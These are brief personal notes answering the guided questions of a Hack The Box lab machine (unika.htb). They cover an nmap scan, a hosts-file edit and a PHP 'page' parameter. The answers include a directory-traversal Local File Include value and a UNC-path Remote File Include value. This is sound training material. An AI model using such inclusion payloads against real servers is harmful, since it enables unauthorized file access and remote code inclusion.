how many TCP ports are open on the machine
nmap -sC -sV -sS -oN scanned IP__ -T5
ada 2 :
80/tcp open http apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

when visiting web service, what is the domain we redirected to
unika.htb

which scripting lang is being used on the server to generate webpages
php

to run this website on our local machine, we need to add the ip into
the /etc/hosts file
sudo nano /etc/hosts
*add this between 127.0.1.1 hostname and desireable IPv6 hosts*
"""
# HTB
IP__
"""

what is name of URL parameter which is used to load different lang
version of the webpage
page

which of the following val for the 'page' parameter would be an 
example of exploiting a Local File Include (LFI) vuln :
- "french.html"
- "//10.10.14.6/somefile"
- "../../../../../../../../windows/system32/drivers/etc/hosts"
- "minikatz.exe"
answer : "../../../../../../../../windows/system32/drivers/etc/hosts"

which of the following val for the page parameter would be an
example of exploiting a Remote File Include (RFI) vuln :
- "french.html"
- "//10.10.14.6/somefile"
- "../../../../../../../../windows/system32/drivers/etc/hosts"
- "minikatz.exe"
answer : "//10.10.14.6/somefile"

